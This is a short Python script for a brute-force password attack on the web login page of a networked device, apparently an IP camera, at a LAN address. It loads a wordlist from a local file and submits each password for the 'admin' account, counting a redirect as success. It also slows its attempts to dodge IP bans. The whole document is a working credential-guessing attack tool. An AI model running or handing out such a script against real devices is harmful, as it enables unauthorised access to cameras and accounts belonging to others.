import requests
from urllib.parse import urlparse, parse_qs
import time
import sys

# --- CONFIGURATION ---
TARGET_IP = "192.168.200.6"
LOGIN_URL = f"http://{TARGET_IP}/home.htm"  # Adjust if your login page is different (e.g., /login.php)
USERNAME_TO_TEST = "admin"                  # Username to brute force against

# Common passwords list (You can expand this or load from a file)
PASSWORDS = [i.strip().encode('latin-1', errors='replace').decode('latin-1') for i in open("c:/Users/ben/pw.txt", "r", encoding="utf-16").readlines()]
print(PASSWORDS[:10])
# --- FUNCTIONS ---

def send_login_request(username, password):
    """
    Sends a POST request to the login page with credentials.
    Returns True if login was successful (redirect detected), False otherwise.
    """
    try:
        # Prepare the data for the form submission
        payload = {
            'username': username,
            'password': password
        }

        # Send POST request
        response = requests.post(LOGIN_URL, data=payload)
        
        # Check if we got a 302/301 redirect (indicating success)
        # Most login pages redirect to the dashboard upon successful auth
        if response.status_code in [301, 302]:
            return True
        
        # Optional: Check for specific success text or cookies
        # Some cameras don't redirect but set a session cookie. 
        # If you know your camera does this, uncomment the logic below:
        """
        if 'session' in response.cookies and len(response.text) < 500:
            return True
        """

    except requests.exceptions.ConnectionError:
        print(f"Connection error to {TARGET_IP}")
        return False
    except Exception as e:
        print(f"Unexpected error: {e}")
        return False

def main():
    print(f"[*] Starting brute-force attack on {TARGET_IP}...")
    print(f"[*] Username: {USERNAME_TO_TEST}")
    print(f"[*] Passwords to try: {len(PASSWORDS)}")
    
    found = False
    
    for password in PASSWORDS:
        # Attempt login
        if send_login_request(USERNAME_TO_TEST, password):
            print(f"\n[+] SUCCESS! Found credentials!")
            print(f"Username: {USERNAME_TO_TEST}")
            print(f"Password: {password}")
            
            # Optional: Save to file or print dashboard URL
            # You can use the 'response' object here to get the redirect location if needed
            
            found = True
            break
        
        # Rate limiting to avoid IP bans (adjust delay based on your camera's tolerance)
        time.sleep(1.5) 
        
    if not found:
        print("\n[-] No common passwords found in this list.")
        print("[-] Try increasing the password list or checking for a 'Forgot Password' link.")

if __name__ == "__main__":
    main()
